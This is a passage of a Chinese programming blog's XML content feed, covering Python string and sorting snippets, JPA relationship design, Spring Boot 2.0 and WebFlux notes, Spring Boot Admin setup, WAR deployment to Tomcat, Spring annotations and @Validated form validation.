__name__ == <span class="string">'__main__'</span>:    </span><br><span class="line">    source_dir = <span class="string">"D://test/"</span></span><br><span class="line">    target_dir = <span class="string">"D://test/png"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        os.makedirs(target_dir)</span><br><span class="line">    files = get_dir_heic_files(source_dir)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        target_file_path = <span class="string">'&#123;&#125;/&#123;&#125;.png'</span>.format(target_dir,file[<span class="string">'filename'</span>])</span><br><span class="line">        heic2Png(file[<span class="string">'filepath'</span>],target_file_path)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python测试代码</title>
    <url>/Python/Python%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h3 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str = <span class="string">"ABCDEFGFEE03"</span></span><br><span class="line"><span class="keyword">print</span> (str[<span class="number">10</span>:<span class="number">12</span>])</span><br><span class="line"><span class="comment"># 输出：03</span></span><br></pre></td></tr></table></figure>
<h3 id="分割字符串取倒数第一个"><a href="#分割字符串取倒数第一个" class="headerlink" title="分割字符串取倒数第一个"></a>分割字符串取倒数第一个</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str = <span class="string">"HELLO6CF51D000003"</span></span><br><span class="line">print(str.split(<span class="string">'0000'</span>)[<span class="number">-1</span>])</span><br><span class="line"><span class="comment"># 输出：03</span></span><br></pre></td></tr></table></figure>
<h3 id="列表中的字符串排序"><a href="#列表中的字符串排序" class="headerlink" title="列表中的字符串排序"></a>列表中的字符串排序</h3><p>语法：list.sort(key=None, reverse=False) ，<a href="https://docs.python.org/zh-cn/3.7/howto/sorting.html" target="_blank" rel="noopener">【参考】</a></p>
<p>Int型排序<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>]</span><br><span class="line">a.sort()</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment"># 输出：[1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure></p>
<p>字符默认排序<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">list = [<span class="string">'123'</span>, <span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="string">'Taobao'</span>, <span class="string">'Facebook'</span>];</span><br><span class="line">list.sort()</span><br><span class="line">print(list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：['123', 'Facebook', 'Google', 'Runoob', 'Taobao']</span></span><br></pre></td></tr></table></figure></p>
<p>表达式排序<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">list = [<span class="string">'ch1.txt'</span>, <span class="string">'ch3.txt'</span>, <span class="string">'ch9.txt'</span>, <span class="string">'ch10.txt'</span>, <span class="string">'ch11.txt'</span>]</span><br><span class="line">list.sort(key = <span class="keyword">lambda</span> x:int(re.match(<span class="string">'\D+(\d+)\.txt'</span>,x).group(<span class="number">1</span>)))</span><br><span class="line">print(list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：['ch1.txt', 'ch3.txt', 'ch9.txt', 'ch10.txt', 'ch11.txt']</span></span><br></pre></td></tr></table></figure></p>
<p>自定义排序</p>
<blockquote>
<p>按照字符尾数数字排序</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list = [<span class="string">"HEADF84300000A"</span>,<span class="string">"HEAD97AB000009"</span>,<span class="string">"HEADF51D000003"</span>,<span class="string">"HEAD7952000002"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一： 按照截取位置最后6位字符转 Int 16进制来排序</span></span><br><span class="line"><span class="comment"># list.sort(key=lambda x:int(x[8:14],16))</span></span><br><span class="line"><span class="comment"># 方法二： 按照'0000'分割，取最后2位转 Int 16进制来排序</span></span><br><span class="line">list.sort(key=<span class="keyword">lambda</span> x:int(x.split(<span class="string">'0000'</span>)[<span class="number">-1</span>],<span class="number">16</span>))</span><br><span class="line">print(list)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>JPA基于User的收藏文章的关系选择</title>
    <url>/SpringBoot/SpringBoot%20JPA%E5%9F%BA%E4%BA%8EUser%E7%9A%84%E6%94%B6%E8%97%8F%E6%96%87%E7%AB%A0%E7%9A%84%E5%85%B3%E7%B3%BB%E9%80%89%E6%8B%A9/</url>
    <content><![CDATA[<h4 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h4><p>很多文章，很多用户，用户把喜欢的文章添加在账户下，方便查看自己的<code>收藏记录</code>，但是文章不在本地数据库。</p>
<h4 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h4><p>三张表（用户表，收藏文章表，用户-收藏文章的<code>中间表</code>），一个用户对应多个收藏记录，<code>用户实体类</code>维护关系。<br>一个收藏记录只能被一个用户所添加，所有每次收藏，都要生成新的收藏记录。</p>
<p>缺点：</p>
<ol>
<li>产生多条记录</li>
<li>每次获取<code>用户实体</code>，都有带<code>收藏记录</code>，比如登录等业务是不需要这部分数据的。</li>
</ol>
<p>如果2个用户收藏同1篇文章，<code>收藏文章表</code>和<code>中间表</code>都会产生两条<code>收藏记录</code></p>
<h4 id="多对一"><a href="#多对一" class="headerlink" title="多对一"></a>多对一</h4><p>两张表（用户表，收藏文章表），多个<code>收藏记录</code>对应一个用户，<code>收藏文章实体类</code>维护关系</p>
<p>每次都要在 <code>收藏文章表</code> 生成新的<code>收藏记录</code>。<br>缺点：</p>
<ol>
<li><code>收藏记录</code>的内容可以重复（不同用户）<br>2.获取<code>收藏记录</code>时，会把用户的所有数据都拿出来，包括密码和token这些。<br>优点：</li>
<li>不污染<code>用户实体类</code></li>
<li>数据表比较少</li>
</ol>
<p>如果2个用户收藏同1篇文章，<code>收藏文章表</code>产生两条收藏记录</p>
<h4 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h4><p>三张表（用户表，收藏文章表，用户-收藏文章的中间表），多个<code>用户</code>对应多个<code>收藏记录</code>，<code>用户实体类</code>维护关系。</p>
<p>优点：解决<code>多对一</code>和<code>一对多</code>的数据重复<br>缺点：和<code>一对多</code>的获取<code>用户实体</code>一样，都有收藏记录。</p>
<h6 id="最后，以上三个关系还是选择多对一的关系，但是获取收藏记录带有所有的用户数据，这样也不太好，所以最后的最后，不用关系了，在多对一的基础上，用一个用户Id替代了。"><a href="#最后，以上三个关系还是选择多对一的关系，但是获取收藏记录带有所有的用户数据，这样也不太好，所以最后的最后，不用关系了，在多对一的基础上，用一个用户Id替代了。" class="headerlink" title="最后，以上三个关系还是选择多对一的关系，但是获取收藏记录带有所有的用户数据，这样也不太好，所以最后的最后，不用关系了，在多对一的基础上，用一个用户Id替代了。"></a>最后，以上三个关系还是选择<code>多对一</code>的关系，但是获取收藏记录带有所有的用户数据，这样也不太好，所以最后的最后，不用关系了，在多对一的基础上，用一个用户Id替代了。</h6><p>各种关系的具体代码看自己的项目 springboot-demo/springboot-demo-mysql</p>
<p>折腾这么久，还真的想用nosql算了，像mongodb的用户文档，想怎么添加收藏记录就怎么添加，哈哈！</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>springboot2.0</title>
    <url>/SpringBoot/SpringBoot2.0/</url>
    <content><![CDATA[<p>在是否升级的考虑上，虽然不着急升级，但是要考虑以后发展的方向，比如2.0不支持的，我们在1.x中也要少用，方便以后升级。</p>
<ul>
<li>Spring Boot 2.0 支持Java 9 ，最低 Java 8版本。</li>
<li>Spring Boot 1.x版本明确说明了没有对Java 9的支持计划。</li>
<li>要求Gradle最低版本为3.4。</li>
<li>要求Tomcat最低版本为8.5。</li>
<li>要求Jetty最低版本为9.4。</li>
<li>spring-boot-starter-mustache和spring-boot-starter-thymeleaf不再依赖spring-boot-starter-web，现在你要自己选择并添加spring-boot-starter-web或spring-boot-starter-webflux作为依赖。</li>
</ul>
<blockquote>
<p>更详细的访问以下文章</p>
<ul>
<li><a href="http://blog.didispace.com/spring-boot-2-release/" target="_blank" rel="noopener">Spring Boot 2.0 正式发布，升还是不升呢？</a></li>
<li><a href="http://blog.didispace.com/Spring-Boot-2-0-%E6%96%B0%E7%89%B9%E6%80%A7%E5%92%8C%E5%8F%91%E5%B1%95%E6%96%B9%E5%90%91/" target="_blank" rel="noopener">Spring Boot 2.0 新特性和发展方向</a></li>
<li><a href="http://blog.didispace.com/Spring-Boot-2.0%E4%B8%8EJava-9/" target="_blank" rel="noopener">Spring Boot 2.0 与 Java 9</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>spring-boot-starter-webflux简介</title>
    <url>/SpringBoot/SpringBootWebFlux/</url>
    <content><![CDATA[<p>在Spring Boot2中引入了 <a href="https://github.com/reactor/reactor-netty" target="_blank" rel="noopener">Reactor Netty</a> ，不过名字叫 <a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web-reactive.html" target="_blank" rel="noopener">Webflux</a> 。</p>
<blockquote>
<p><code>org.springframework.boot:spring-boot-starter-webflux</code> -&gt; <code>io.projectreactor.netty:reactor-netty</code> -&gt; <code>io.netty:netty-all</code></p>
</blockquote>
<p>要了解 WebFlux ，首先了解下什么是 Reactive Streams（响应式流） ：</p>
<blockquote>
<p>要真打算用weblux，感觉需要整体学一下Reactive响应式编程，否则很多东西不懂</p>
</blockquote>
<h4 id="Reactive-Streams-是-JVM-中面向流的库标准和规范："><a href="#Reactive-Streams-是-JVM-中面向流的库标准和规范：" class="headerlink" title="Reactive Streams 是 JVM 中面向流的库标准和规范："></a>Reactive Streams 是 JVM 中面向流的库标准和规范：</h4><ul>
<li>处理可能无限数量的元素</li>
<li>按顺序处理</li>
<li>组件之间异步传递</li>
<li>强制性非阻塞背压（Backpressure）</li>
</ul>
<h4 id="Reactive-Streams-的组成"><a href="#Reactive-Streams-的组成" class="headerlink" title="Reactive Streams 的组成"></a>Reactive Streams 的组成</h4><ul>
<li>发布者：发布元素到订阅者</li>
<li>订阅者：消费元素</li>
<li>订阅：在发布者中，订阅被创建时，将与订阅者共享</li>
<li>处理器：发布者与订阅者之间处理数据</li>
</ul>
<h4 id="Reactive-Streams-响应式编程"><a href="#Reactive-Streams-响应式编程" class="headerlink" title="Reactive Streams 响应式编程"></a>Reactive Streams 响应式编程</h4><p>Reactor 一般提供两种响应式 API ：</p>
<ul>
<li>Mono：实现发布者，并返回 0 或 1 个元素</li>
<li>Flux：实现发布者，并返回 N 个元素</li>
</ul>
<p>一般是将 Publisher 作为输入，在框架内部转换成 Reactor 类型并处理逻辑，然后返回 Flux 或 Mono 作为输出。</p>
<h4 id="Webflux"><a href="#Webflux" class="headerlink" title="Webflux"></a>Webflux</h4><p>Spring Boot Webflux 就是基于 Reactor Netty 实现的。Spring Boot 2.0 包括一个新的 spring-webflux 模块。该模块包含对响应式 HTTP 和 WebSocket 客户端的支持，以及对 REST，HTML 和 WebSocket 交互等程序的支持。</p>
<p>一般来说，<strong> Spring MVC 用于同步处理，Spring Webflux 用于异步处理 </strong> 。</p>
<p><img src="/images/SpringBoot/spring_reactive_web.png" alt="webflux"><br><img src="/images/SpringBoot/spring-mvc-and-webflux-venn.png" alt="webflux"></p>
<p>Spring Boot Webflux 有两种编程模型实现，一种类似 Spring MVC 注解方式，另一种是使用其功能性端点方式。</p>
<p>微服务体系结构，WebFlux 和 MVC 可以混合使用。尤其开发 IO 密集型服务的时候，选择 WebFlux 去实现。</p>
<p><img src="/images/SpringBoot/webflux.png" alt="webflux"></p>
<blockquote>
<p>Reactor Netty是一个异步事件驱动的网络应用程序框架。它提供非阻塞和背压就绪的TCP，HTTP和UDP客户端和服务器。顾名思义，它基于Netty框架。<br>Spring Boot会 自动将 Reactor Netty 配置为默认服务器。除此之外，我们可以明确地将Reactor Netty添加到我们的项目中，Spring Boot应该再次自动配置它。</p>
</blockquote>
<p>WebFlux 默认是通过 Netty 启动，并且自动设置了默认端口为 8080。另外还提供了对 Jetty、Undertow 等容器的支持。开发者自行在添加对应的容器 Starter 组件依赖，即可配置并使用对应内嵌容器实例。</p>
<p><strong> spring-boot-starter </strong><br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot,webflux,spring-boot-starter-webflux</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot使用Admin监控应用</title>
    <url>/SpringBoot/SpringBoot%E4%BD%BF%E7%94%A8Admin%E7%9B%91%E6%8E%A7%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>spring-boot-admin 分为两部分，server和client。<br>其中，server是监控端，client是被监控端，client就是我们的应用项目。</p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><ol>
<li>创建一个springboot项目，创建项目时选择ops-actuator</li>
<li><p>添加依赖，版本保持最新（参考网上教程写demo时，版本是1.3.2，一直启动不起来）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;de.codecentric&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-admin-server&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.5.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;de.codecentric&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-admin-server-ui&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.5.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server.port=8090</span><br><span class="line">spring.application.name=Spring Boot Admin Web</span><br><span class="line">spring.boot.admin.url=http://localhost:$&#123;server.port&#125;</span><br><span class="line">spring.jackson.serialization.indent_output=true</span><br><span class="line">endpoints.health.sensitive=false</span><br></pre></td></tr></table></figure>
</li>
<li><p>在SpringBootAdminWebApplication上面添加注解</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.example.admin;</span><br><span class="line"></span><br><span class="line">import de.codecentric.boot.admin.config.EnableAdminServer;</span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication</span><br><span class="line">@EnableAdminServer</span><br><span class="line">public class SpringbootDemoAdminServerApplication &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		SpringApplication.run(SpringbootDemoAdminServerApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动，如果跑起来了就OK了。</p>
</li>
<li>浏览器访问 <code>http://localhost:8090</code><br>效果：<br><img src="/images/SpringBoot/SpringBoot使用Admin监控应用1.png" alt="111111111111111.png"></li>
</ol>
<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><ol>
<li><p>添加依赖</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.codecentric&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.5.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring.application.name=@project.description@</span><br><span class="line">server.port=8080</span><br><span class="line">spring.boot.admin.url=http://localhost:8090</span><br><span class="line">management.security.enabled: false</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>management.security.enabled: false 意思是不用授权或者登陆就可以访问，默认是true，server </p>
<ol start="3">
<li>这样Client就被监控啦</li>
</ol>
<p><img src="/images/SpringBoot/SpringBoot使用Admin监控应用2.png" alt="2222222222222.png"></p>
<p>这东西当然不止这么简单，还有更多详细的用法。<br>扩展阅读：<br><a href="https://github.com/codecentric/spring-boot-admin" target="_blank" rel="noopener">https://github.com/codecentric/spring-boot-admin</a><br><a href="http://blog.csdn.net/kinginblue/article/details/52132113" target="_blank" rel="noopener">http://blog.csdn.net/kinginblue/article/details/52132113</a></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>SpringBoot学习资料整理</title>
    <url>/SpringBoot/SpringBoot%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<ol>
<li><p>spring-boot-examples</p>
<p> <a href="https://github.com/ityouknow/spring-boot-examples" target="_blank" rel="noopener">Github</a></p>
</li>
<li><p>spring-boot-quick<br> <a href="https://github.com/vector4wang/spring-boot-quick" target="_blank" rel="noopener">Github</a><br> 基于springboot的快速学习示例,整合各种LZ遇到的开源框架,如：<br> rabbitmq、jpa、redies、oauth2、swagger、jsp、docker、spring-batch、异常处理、日志输出、多模块开发、多环境打包等等</p>
</li>
</ol>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>springboot打war包部署到外部Tomcat</title>
    <url>/SpringBoot/SpringBoot%E6%89%93war%E5%8C%85%E9%83%A8%E7%BD%B2%E5%88%B0%E5%A4%96%E9%83%A8Tomcat/</url>
    <content><![CDATA[<ul>
<li><p>配置文件pom.xml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line">-----------------------------------完美分割线</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class="line">	&lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">-----------------------------------完美分割线</span><br><span class="line">&lt;build&gt;</span><br><span class="line">	&lt;finalName&gt;testJenkins&lt;/finalName&gt;</span><br><span class="line">&lt;/build&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>application.properties</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># context-path 和 pom.xml的build-finalName 一致</span><br><span class="line">server.context-path=/testJenkins</span><br><span class="line"></span><br><span class="line">#如果有指定端口，可以去掉。</span><br><span class="line">#server.port=9990</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写启动类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class TomcatServletInitializer extends SpringBootServletInitializer &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) &#123;</span><br><span class="line"></span><br><span class="line">        //Application.class就是springboot的 @SpringBootApplication 类</span><br><span class="line">        return application.sources(Application.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>命令打包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn package</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><a href="http://blog.csdn.net/u014087707/article/details/51792482" target="_blank" rel="noopener">参考了此文</a></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>Spring注解@Component、@Repository、@Service、@Controller区别</title>
    <url>/SpringBoot/Spring%E6%B3%A8%E8%A7%A3@Component%E3%80%81@Repository%E3%80%81@Service%E3%80%81@Controller%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p><a href="http://blog.csdn.net/zhang854429783/article/details/6785574" target="_blank" rel="noopener">http://blog.csdn.net/zhang854429783/article/details/6785574</a></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>Spring注解</title>
    <url>/SpringBoot/Spring%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="Bean-声明注解"><a href="#Bean-声明注解" class="headerlink" title="Bean 声明注解"></a>Bean 声明注解</h3><ul>
<li>@Service 业务逻辑层</li>
<li>@Component 组件</li>
<li>@Repository 数据访问层</li>
<li>@Controller Spring mvc 展现层</li>
<li>@Configurable 声明当前类是一个配置类！！！</li>
<li><p>@ComponentScan(“com.reachauto.cxn.book.test”)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置自动扫描包下面所有的</span><br><span class="line">  @Service @Component @Repository @Controller</span><br></pre></td></tr></table></figure>
</li>
<li><p>@EnableAsync</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开启异步任务支持</span><br></pre></td></tr></table></figure>
</li>
<li><p>@PropertySource(“classpath:demo.properties”)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Component</span><br><span class="line">@PropertySource(&quot;classpath:demo.properties&quot;)</span><br><span class="line">public class Demo &#123;</span><br><span class="line"></span><br><span class="line">  @Value(&quot;$&#123;kk.name&#125;&quot;)</span><br><span class="line">  private String aaa;</span><br></pre></td></tr></table></figure>
</li>
<li><p>@EnableScheduling 注解开启对计划任务的支持</p>
</li>
</ul>
<h3 id="Bean-注入注解"><a href="#Bean-注入注解" class="headerlink" title="Bean 注入注解"></a>Bean 注入注解</h3><ul>
<li>@Autowired Spring 提供</li>
<li>@Resource JSR-250</li>
<li>@Value(“xxxx”) 注入普通字符串</li>
<li>@Value(“${xxx.xxx}”) 注入配置文件中字符串</li>
<li>@PostConstruct 标注在方法上，在构造函数执行完毕后执行</li>
<li>@PreDestroy Bean 标注在方法上，销毁前执行</li>
<li>@Async 异步方法表明，若是在class上则全是</li>
<li>@Scheduled 声明方法是计划任务</li>
<li>@Conditional() 条件注解，当满足某条件时</li>
</ul>
<h3 id="Spring-MCV"><a href="#Spring-MCV" class="headerlink" title="Spring MCV"></a>Spring MCV</h3><ul>
<li><p>@RequestMapping</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于映射Web请求 返回体，编码格式都可以在此处设置</span><br><span class="line">  produces = &#123;&#125; 设置返回值json/xml charset 等</span><br></pre></td></tr></table></figure>
</li>
<li><p>@RestController</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是个组合注解，组合了@Controller和@ResponseBody</span><br></pre></td></tr></table></figure>
</li>
<li><p>@ResponseBody</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">支持返回体放入response体中，而不是直接返回一个页面，</span><br><span class="line">此注解可以放在返回值或者方法体上</span><br></pre></td></tr></table></figure>
</li>
<li><p>@RequestBody</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">允许参数在request体里，而不是在地址栏后面</span><br></pre></td></tr></table></figure>
</li>
<li><p>@PathVariable</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用来接收路径参数，api/&#123;id&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><a href="https://gumutianqi1.gitbooks.io/specification-doc/content/tools-doc/basic-annotation.html" target="_blank" rel="noopener">https://gumutianqi1.gitbooks.io/specification-doc/content/tools-doc/basic-annotation.html</a></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>SpringBoot注解@Validated表单校验</title>
    <url>/SpringBoot/SpringBoot%E6%B3%A8%E8%A7%A3@Validated%E8%A1%A8%E5%8D%95%E6%A0%A1%E9%AA%8C/</url>
    <content><![CDATA[<blockquote>
<p>Spring3支持JSR-303验证框架，JSR-303 是Java EE 6 中的一项子规范，叫做BeanValidation，官方参考实现是hibernate Validator（与Hibernate ORM 没有关系），JSR 303 用于对Java Bean 中的字段的值进行验证。</p>
</blockquote>
<h2 id="1-表单属性"><a href="#1-表单属性" class="headerlink" title="1. 表单属性"></a>1. 表单属性</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotBlank</span>(message = <span class="string">"name不能为空"</span>)</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-Controller中开启验证"><a href="#2-Controller中开启验证" class="headerlink" title="2. Controller中开启验证"></a>2. Controller中开启验证</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.validation.annotation.Validated;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/register"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title">register</span><span class="params">(@Validated User user)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/register"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title">register</span><span class="params">(@Valid User user)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-处理异常"><a href="#3-处理异常" class="headerlink" title="3. 处理异常"></a>3. 处理异常</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@Validated校验的异常</span></span><br><span class="line"><span class="meta">@ExceptionHandler</span>(MethodArgumentNotValidException<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">ResponseEntity</span>&lt;<span class="title">String</span>&gt; <span class="title">handleValidException</span>(<span class="title">MethodArgumentNotValidException</span> <span class="title">e</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bindingResultToMsg(e.getBindingResult());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@Valid校验的异常</span></span><br><span class="line"><span class="meta">@ExceptionHandler</span>(BindException<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">ResponseEntity</span>&lt;<span class="title">String</span>&gt; <span class="title">handleValidException</span>(<span class="title">BindException</span> <span class="title">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bindingResultToMsg(e.getBindingResult());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> ResponseEntity&lt;String&gt; <span class="title">bindingResultToMsg</span><span class="params">(BindingResult result)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    List&lt;ObjectError&gt; errors = result.getAllErrors();</span><br><span class="line">    StringBuffer errorMsg = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    errors.forEach(x -&gt; errorMsg.append(x.getDefaultMessage()).append(<span class="string">";"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity</span><br><span class="line">            .status(<span class="number">200</span>)</span><br><span class="line">            .body(errorMsg.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-前端提交表单"><a href="#4-前端提交表单" class="headerlink" title="4. 前端提交表单"></a>4. 前端提交表单</h2><p>针对 <code>register(@Validated User user)</code> 的表单提交，支持 <code>Params</code> 和 <code>multipart/form-data</code> ，不支持 <code>Content-Type: application/json</code> 的Body提交方式。</p>
<h2 id="5-支持Body提交"><a href="#5-支持Body提交" class="headerlink" title="5. 支持Body提交"></a>5. 支持Body提交</h2><p>加上 <code>@RequestBody</code> 注解即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/register"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title">register</span><span class="params">(@RequestBody @Valid User user)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h2 id="完整校验注解"><a href="#完整校验注解" class="headerlink" title="完整校验注解"></a>完整校验注解</h2><ul>
